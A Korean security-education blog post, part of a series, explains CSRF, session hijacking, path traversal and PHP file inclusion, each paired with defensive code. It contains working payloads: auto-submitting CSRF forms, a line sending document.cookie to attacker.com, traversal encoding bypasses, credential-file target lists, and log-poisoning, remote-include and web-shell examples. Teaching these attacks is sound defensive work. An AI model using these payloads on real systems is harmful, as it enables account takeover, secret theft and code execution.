---
title: "공격자의 시선으로 보는 보안: 4편 - 웹 공격 Part 2 (인증/세션/접근 제어)"
date: 2026-02-22T18:00:00+09:00
categories:
  - study
  - Security
tags: ["security", "csrf", "session-hijacking", "directory-traversal", "file-inclusion", "owasp", "web-security"]
summary: "코드 한 줄을 고쳐도 안 되는 공격이 있다. CSRF, Session Hijacking, Directory Traversal, File Inclusion은 인증과 접근 제어 설계 자체의 문제를 공격한다. 구조적 취약점의 원리와 방어를 분석한다."
showtoc: true
tocopen: true
draft: false
series: ["공격자의 시선으로 보는 보안"]
series_order: 4
---

## 배경

3편에서 다룬 인젝션 공격은 "입력값 처리 코드 한 줄"을 고치면 해결된다.
이번 편에서 다루는 공격은 다르다.

CSRF는 브라우저가 쿠키를 자동으로 전송하는 설계를 이용한다.
Session Hijacking은 세션 ID 관리 방식의 구조적 문제다.
Directory Traversal과 File Inclusion은 파일 시스템 접근 제어 설계 문제다.

**인증과 접근 제어** 자체를 공격하기 때문에 방어도 구조적 변경이 필요하다.

---

## 1. CSRF (Cross-Site Request Forgery)

### 원리

브라우저는 요청을 보낼 때 해당 도메인의 쿠키를 **자동으로** 포함한다.
이 특성을 이용해 사용자 모르게 요청을 위조한다.

```
시나리오:
1. 사용자가 bank.com에 로그인 → 세션 쿠키 발급
2. 사용자가 attacker.com 방문
3. attacker.com의 페이지에 숨겨진 코드:
   <img src="http://bank.com/transfer?to=attacker&amount=1000000">
4. 브라우저: bank.com 요청 → 쿠키 자동 포함 → bank.com은 정상 요청으로 인식
5. 결과: 사용자 모르게 계좌이체 실행
```

**Same-Origin Policy가 있는데 왜 가능한가?**

Same-Origin Policy는 **응답을 읽는 것**을 차단하지, **요청을 보내는 것**을 차단하지 않는다.
`<img>`, `<form>` 태그는 크로스 도메인 요청을 허용한다.

### 공격 코드 예시

**GET 요청 위조**:
```html
<!-- attacker.com에 삽입 -->
<!-- 피해자가 페이지를 열면 자동으로 실행 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000" style="display:none">
```

**POST 요청 위조** (자동 제출 폼):
```html
<form id="csrf" action="http://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker">
  <input name="amount" value="1000000">
</form>
<script>document.getElementById("csrf").submit();</script>
```

**JSON API 위조** (Content-Type 제한 우회):
```html
<!-- application/json은 Preflight가 필요하지만 text/plain은 아님 -->
<form action="http://api.target.com/update" method="POST" enctype="text/plain">
  <input name='{"action":"delete","id":"1"}' value="">
</form>
```

### 조건

CSRF가 성립하려면:
1. 사용자가 대상 사이트에 로그인되어 있어야 함
2. 요청이 세션 쿠키만으로 인증되어야 함 (추가 인증 없음)
3. 서버가 요청 출처를 검증하지 않아야 함

### 방어

**1. CSRF Token (가장 일반적)**:
```html
<!-- 서버가 HTML 폼에 고유 토큰 삽입 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="a3f8c2d1e9b4...">
  <input name="amount" value="">
  <button type="submit">이체</button>
</form>
```

```java
// 서버에서 검증
String expectedToken = session.getAttribute("csrfToken");
String submittedToken = request.getParameter("_csrf");
if (!expectedToken.equals(submittedToken)) {
    throw new SecurityException("CSRF 토큰 불일치");
}
```

attacker.com은 bank.com의 세션에서 CSRF Token을 읽을 수 없다 (SOP).
따라서 올바른 토큰을 포함한 요청을 위조할 수 없다.

**2. SameSite Cookie**:
```http
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly

# Strict: 크로스 사이트 요청에서 쿠키 전송 안 함
# Lax: GET 요청은 허용, POST는 차단 (기본값)
# None: 항상 전송 (Secure 필수)
```

**3. Origin / Referer 헤더 검증**:
```java
String origin = request.getHeader("Origin");
String referer = request.getHeader("Referer");

if (!origin.equals("https://bank.com") && !referer.startsWith("https://bank.com")) {
    throw new SecurityException("비허용 Origin");
}
// 단점: Referer를 제거하거나 스푸핑할 수 있어 보조 수단으로만 사용
```

---

## 2. Session Hijacking (세션 탈취)

### 세션 동작 원리

HTTP는 무상태(Stateless) 프로토콜이다.
로그인 상태를 유지하기 위해 세션을 사용한다.

```
1. 사용자 로그인
2. 서버: 세션 ID 생성 → DB 저장 → 쿠키로 전송
3. 이후 요청: 쿠키의 세션 ID로 사용자 식별
4. 공격: 세션 ID를 탈취하면 = 해당 사용자로 위장
```

### 세션 ID 탈취 방법

**방법 1: 네트워크 스니핑**
```
HTTP (평문) 사용 시:
→ Wireshark, tcpdump로 패킷 캡처
→ Cookie 헤더에서 세션 ID 추출
→ 해당 세션 ID로 요청 전송

방어: HTTPS 강제 사용 (HSTS)
```

**방법 2: XSS를 통한 탈취**
```javascript
// XSS 취약점을 이용
document.location = 'http://attacker.com/steal?c=' + document.cookie;
// 세션 쿠키가 공격자 서버로 전송

방어: HttpOnly 쿠키 플래그 (JavaScript로 접근 불가)
```

**방법 3: Session Fixation**

고정된 세션 ID를 피해자에게 사용하게 만드는 공격.

```
1. 공격자: 사이트에 접속 → 세션 ID 획득 (예: SID=abc123)
2. 공격자: 피해자에게 이 세션 ID를 가진 URL 전달
   http://target.com/login?sessionid=abc123
3. 피해자: URL 클릭 → 로그인
4. 서버: 로그인 성공 → 기존 세션 ID(abc123)를 유지 (취약한 구현)
5. 공격자: SID=abc123으로 피해자 계정 접근

방어: 로그인 성공 후 반드시 새 세션 ID 발급
```

```java
// 취약한 코드
session.setAttribute("user", authenticatedUser);
// 기존 세션 ID 유지

// 안전한 코드 (Spring Security)
SecurityContextHolder.getContext().setAuthentication(auth);
// 내부적으로 세션 무효화 후 새 ID 발급
// session.invalidate() + request.getSession(true)
```

**방법 4: 예측 가능한 세션 ID**

```
취약한 세션 ID 생성:
ID = MD5(username + timestamp)
→ 타임스탬프 추측 가능 → 브루트포스 가능

안전한 세션 ID:
→ 암호학적으로 안전한 난수 생성기 사용
→ 128bit 이상의 엔트로피
→ OWASP: SecureRandom 사용 권장
```

### 세션 관리 체크리스트

```
[ ] HTTPS 강제 (HSTS 헤더)
[ ] HttpOnly, Secure 쿠키 플래그
[ ] SameSite=Strict or Lax
[ ] 로그인 후 새 세션 ID 발급
[ ] 세션 타임아웃 설정 (비활성 15-30분)
[ ] 로그아웃 시 서버 세션 삭제
[ ] 동시 세션 제한 (선택)
```

---

## 3. Directory Traversal (Path Traversal)

### 원리

`../`를 이용해 웹 루트 밖의 파일에 접근하는 공격.

```
취약한 URL:
http://target.com/download?file=report.pdf

서버 코드:
String filePath = "/var/www/files/" + fileName;
// fileName = "report.pdf" → /var/www/files/report.pdf

공격:
http://target.com/download?file=../../../../etc/passwd
// filePath = /var/www/files/../../../../etc/passwd
//          = /etc/passwd
```

### 우회 기법

기본 필터를 우회하는 방법이 다양하다.

```
기본 시도: ../../../../etc/passwd
URL 인코딩: %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
더블 인코딩: %252e%252e%252f (서버가 두 번 디코딩할 때)
유니코드: ..%c0%af../..%c0%af../etc/passwd (일부 구현)
Null Byte: ../../../../etc/passwd%00.jpg (PHP 구버전)
   → .jpg 확장자 검사를 통과하고 Null에서 문자열 종료
```

### 공격 대상

```bash
# Linux 주요 타깃
/etc/passwd          # 사용자 계정 목록 (패스워드는 shadow에)
/etc/shadow          # 해시된 패스워드 (root 권한 필요)
/etc/hosts           # 내부 네트워크 구조
/proc/self/environ   # 환경 변수 (DB 비밀번호 노출 가능)
/var/log/apache2/access.log  # 웹 로그 (LFI 조합 공격 가능)
~/.ssh/id_rsa        # SSH Private Key

# Windows 주요 타깃
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\Windows\win.ini
```

### 방어

**1. 경로 정규화 후 검증**:
```java
import java.nio.file.Path;
import java.nio.file.Paths;

String allowedDir = "/var/www/files/";
String requestedFile = request.getParameter("file");

Path basePath = Paths.get(allowedDir).toRealPath();
Path requestedPath = Paths.get(allowedDir + requestedFile).toRealPath();

// 정규화 후 허용 디렉터리 내에 있는지 확인
if (!requestedPath.startsWith(basePath)) {
    throw new SecurityException("디렉터리 탈출 시도");
}
// toRealPath()가 ../를 모두 해석하고 실제 경로 반환
```

**2. 화이트리스트 방식**:
```java
// 허용된 파일 목록만 제공
Set<String> allowedFiles = Set.of("report.pdf", "guide.pdf", "manual.pdf");
if (!allowedFiles.contains(fileName)) {
    throw new SecurityException("허용되지 않은 파일");
}
```

**3. 파일명 인덱스 사용**:
```
URL: /download?id=1
서버: id=1 → files[1] = "report.pdf" (직접 매핑)
사용자 입력이 파일 경로에 포함되지 않음
```

---

## 4. File Inclusion (파일 삽입)

### 원리

서버 사이드 스크립트(PHP 주로)가 사용자 입력으로 파일을 include할 때 발생.

```php
<?php
// 취약한 코드
$page = $_GET['page'];
include($page . '.php');
?>
```

### LFI (Local File Inclusion)

서버 내부 파일을 include.

```
기본:
http://target.com/index.php?page=../../../etc/passwd

Null Byte 우회 (PHP 5.3 이하):
http://target.com/index.php?page=../../../etc/passwd%00
→ include("../../../etc/passwd\0.php") → \0에서 문자열 종료
→ /etc/passwd가 include됨 (PHP 코드로 해석되면서 내용 노출)
```

**LFI → RCE (코드 실행으로 확대)**:

```
1. 웹 서버 로그 오염 (Log Poisoning):
   - User-Agent에 PHP 코드 삽입
   User-Agent: <?php system($_GET['cmd']); ?>

   - 웹 로그에 기록됨
   /var/log/apache2/access.log

2. 로그 파일을 include:
   http://target.com/?page=../../../var/log/apache2/access.log&cmd=id

3. 로그에 저장된 PHP 코드가 실행됨
```

```
2. /proc/self/environ 이용:
   - 환경 변수에 PHP 코드 삽입 (HTTP_USER_AGENT)
   - /proc/self/environ include → 코드 실행
```

### RFI (Remote File Inclusion)

원격 서버의 파일을 include. LFI보다 직접적이다.

```php
// PHP 설정
allow_url_include = On  ← 이 설정이 활성화되어 있을 때만 가능

// 공격
http://target.com/index.php?page=http://attacker.com/shell.php

// attacker.com/shell.php 내용:
<?php system($_GET['cmd']); ?>
// → 피해자 서버에서 공격자의 코드가 실행됨
```

### PHP Wrapper를 이용한 LFI 확장

PHP에는 다양한 스트림 wrapper가 있다.

```
php://filter:
http://target.com/?page=php://filter/convert.base64-encode/resource=config.php
→ config.php 소스코드를 Base64로 인코딩해서 출력
→ DB 비밀번호, API 키 노출

data:// wrapper:
http://target.com/?page=data://text/plain,<?php system('id');?>
→ 직접 코드 삽입

expect:// wrapper (드물게 설치됨):
http://target.com/?page=expect://id
→ OS 명령 직접 실행
```

### 방어

**1. allow_url_include 비활성화** (RFI 차단):
```ini
; php.ini
allow_url_include = Off
allow_url_fopen = Off  ; 추가 보호
```

**2. include 대상 화이트리스트**:
```php
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die("허용되지 않은 페이지");
}

include($page . '.php');
// 사용자 입력이 파일 경로에 직접 포함되지 않음
```

**3. PHP 버전 업그레이드**:
- PHP 5.3.4 이상: Null Byte 공격 차단
- PHP 7+: 다수의 LFI 관련 취약점 수정

---

## 5. 공격 비교 정리

| 공격 | 핵심 원리 | 피해 | 핵심 방어 |
|------|----------|------|----------|
| CSRF | 쿠키 자동 전송 악용 | 사용자 권한으로 행동 위조 | CSRF Token, SameSite |
| Session Hijacking | 세션 ID 탈취 | 계정 탈취 | HTTPS, HttpOnly, 세션 재발급 |
| Directory Traversal | `../` 경로 탈출 | 서버 파일 열람 | 경로 정규화 검증 |
| File Inclusion | 파일 include 취약점 | 코드 실행, 파일 열람 | 화이트리스트, PHP 설정 |

### 공통 방어 원칙

```
1. 입력값은 절대 신뢰하지 않는다
   → 경로, 세션 ID, 파일명 모두 검증

2. 최소 권한 원칙
   → 웹 서버 프로세스에 필요한 권한만
   → /etc/shadow 읽기 권한 없으면 LFI로도 접근 불가

3. Defense in Depth (다층 방어)
   → WAF + 코드 레벨 방어 + OS 권한 설정
   → 한 계층이 뚫려도 다음 계층에서 차단
```

---

## 마무리

이 편에서 다룬 공격은 모두 **설계 단계의 취약점**이다.

CSRF는 "브라우저가 쿠키를 자동 전송한다"는 설계를,
Session Hijacking은 "세션 ID = 사용자"라는 단순한 인증 설계를,
Directory Traversal과 File Inclusion은 "사용자 입력을 파일 경로에 사용한다"는 설계를 공격한다.

방어도 코드 한 줄이 아닌 **아키텍처 레벨 변경**이 필요하다.

다음 편에서는 이 모든 공격을 막기 위해 등장한 WAF를 공격자가 어떻게 우회하는지 다룬다.

---

*시리즈: 공격자의 시선으로 보는 보안*
- 1편: 정찰과 스캐닝
- 2편: 네트워크 레이어 공격
- 3편: 웹 공격 Part 1 - Injection
- **4편: 웹 공격 Part 2 - 인증/세션/접근 제어** ← 현재 글
- 5편: WAF 우회 기법
